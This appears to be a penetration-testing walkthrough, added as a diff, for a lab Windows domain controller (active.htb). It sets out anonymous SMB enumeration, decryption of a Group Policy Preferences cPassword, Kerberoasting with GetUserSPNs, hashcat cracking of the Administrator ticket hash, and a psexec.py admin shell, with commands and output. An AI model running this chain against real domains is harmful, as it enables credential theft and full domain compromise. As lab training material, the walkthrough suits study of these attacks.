@@ -1,0 +1,164 @@
+########################
+SMB Anonymous connection
+GPP / cPassword Attacks
+crackmapexec enumeration
+KERBEROS - GetUserSPNs
+Hashcat Admin Ticket Hash - TGS-REP 13100 (krb5tgs$23)
+psexec.py to access to Admin session
+########################
+1-Enumeration:
+    nmap -T5 -sV -sC -Pn 10.10.10.100 -oN enum/scan1.logs  -vv 
+        PORT      STATE    SERVICE         REASON      VERSION
+        53/tcp    open     domain          syn-ack     Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) <---- Deprecated Server
+        | dns-nsid: 
+        |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+        88/tcp    open     kerberos-sec    syn-ack     Microsoft Windows Kerberos (server time: 2024-02-21 23:07:23Z)
+        135/tcp   open     msrpc           syn-ack     Microsoft Windows RPC
+        139/tcp   open     netbios-ssn     syn-ack     Microsoft Windows netbios-ssn
+        389/tcp   open     ldap            syn-ack     Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+        445/tcp   open     microsoft-ds?   syn-ack
+        464/tcp   open     kpasswd5?       syn-ack
+        593/tcp   open     ncacn_http      syn-ack     Microsoft Windows RPC over HTTP 1.0
+        3268/tcp  open     ldap            syn-ack     Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+
+        Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+        Host script results:
+        | smb2-security-mode: 
+        |   2:1:0: 
+        |_    Message signing enabled and required
+        |_clock-skew: 0s
+        | smb2-time: 
+        |   date: 2024-02-21T23:08:18
+        |_  start_date: 2024-02-21T23:05:19
+
+
+      SMB/LDAP:
+        Enumerate LDAP:
+            nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.175
+                currentTime: 20240221231059.0Z
+                subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
+                dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
+                namingContexts: DC=active,DC=htb
+                namingContexts: CN=Configuration,DC=active,DC=htb
+                namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
+                namingContexts: DC=DomainDnsZones,DC=active,DC=htb
+                namingContexts: DC=ForestDnsZones,DC=active,DC=htb
+                defaultNamingContext: DC=active,DC=htb
+                schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
+                configurationNamingContext: CN=Configuration,DC=active,DC=htb
+                rootDomainNamingContext: DC=active,DC=htb
+
+                dnsHostName: DC.active.htb
+                ldapServiceName: active.htb:dc$@ACTIVE.HTB
+                serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
+
+        Enumerate SMB:
+            crackmapexec smb 10.10.10.100 -u "" -p "" --shares
+                SMB         10.10.10.100    445    DC       Share           Permissions     Remark
+                SMB         10.10.10.100    445    DC       -----           -----------     ------
+                SMB         10.10.10.100    445    DC       ADMIN$                          Remote Admin
+                SMB         10.10.10.100    445    DC       C$                              Default share
+                SMB         10.10.10.100    445    DC       IPC$                            Remote IPC
+                SMB         10.10.10.100    445    DC       NETLOGON                        Logon server share 
+                SMB         10.10.10.100    445    DC       Replication     READ            
+                SMB         10.10.10.100    445    DC       SYSVOL                          Logon server share 
+                SMB         10.10.10.100    445    DC       Users                           
+
+            Try RPC connection:
+            rpcclient -U "" -N 10.10.10.100
+                rpcclient $> enumdomusers
+                do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
+                rpcclient $> enumdomgroups
+                do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DEN
+
+
+            Connect to SMB:
+                smbclient //10.10.10.100/Replication
+
+                Get all files:
+                    smb: \> mask ""
+                    smb: \> recurse
+                    smb: \> prompt
+                    smb: \> mget *
+
+
+                on Kali SMB UPLOADED FILES:
+                    cat GptTmpl.inf 
+                        MinimumPasswordAge = 1
+                        MaximumPasswordAge = 42
+                        MinimumPasswordLength = 7
+                        PasswordComplexity = 1
+                        PasswordHistorySize = 24    
+                        signature="$CHICAGO$"
+
+                    Groups.xml:
+                        name="active.htb\SVC_TGS"
+
+                        we also foud the GPP / cPassword:
+                            cpassword="...."
+
+2-Exploit:
+    GPP / cPassword Attacks: Group Policy Preferences
+        on Kali: gpp-decrypt <HASH>
+    Now We have the service Name + the Clear PASSWD
+
+    We test our creds with crackmap:
+        crackmapexec smb 10.10.10.100 -u "SVC_TGS" -p "<PASSWD>" --shares
+            SMB         10.10.10.100    445    DC               Share           Permissions     Remark
+            SMB         10.10.10.100    445    DC               -----           -----------     ------
+            SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
+            SMB         10.10.10.100    445    DC               C$                              Default share
+            SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
+            SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
+            SMB         10.10.10.100    445    DC               Replication     READ            
+            SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
+            SMB         10.10.10.100    445    DC               Users           READ      
+
+
+        crackmapexec smb 10.10.10.100 -u SVC_TGS -d active.htb -p '<PASSWD>' --users    
+            SMB         10.10.10.100    445    DC               active.htb\SVC_TGS                        badpwdcount: 0 desc: 
+            SMB         10.10.10.100    445    DC               active.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
+            SMB         10.10.10.100    445    DC               active.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
+            SMB         10.10.10.100    445    DC               active.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
+
+
+        We will continue to perform some enumeration via crackmap:
+            -https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+    We access:
+        smbclient //10.10.10.100/NETLOGON -U'active.htb\SVC_TGS'
+
+
+
+    KERBEROSTING:: - https://tools.thehacker.recipes/impacket/examples/getuserspns.py
+######################################################################################################################################################
+
+    We try to connect via evil-winrm pr psexec.py BUT IT DOESN'T work
+        evil-winrm -i 10.10.10.100 -u SVC_TGS -p '<PASSWD>'
+
+    The SECRETdumps to:
+        sudo /usr/share/doc/python3-impacket/examples/secretsdump.py active.htb/svc_TGS@10.10.10.100
+
+    Even this KERBEROS ATTACK DOSEN'T WORK:
+        python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request
+
+######################################################################################################################################################
+    
+    We Finally try with "GetUserSPNs" can be used to obtain a password hash for user accounts that have an SPN (service principal name).:
+        python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request
+
+    WE GET The Administrator Ticket HASH with the REF (krb5tgs$23):
+        hashcat NTLM.hash /usr/share/wordlists/rockyou.txt -m 13100  (13100 - TGS-REP)
+
+    WE decrypt the PASSW in Clear txt
+
+    WE use psexec.py to access to a session via Admin creds:
+        /usr/share/doc/python3-impacket/examples/psexec.py 'Administrator:<PASSWD>'@10.10.10.100
+
+
+
+
+
+
+
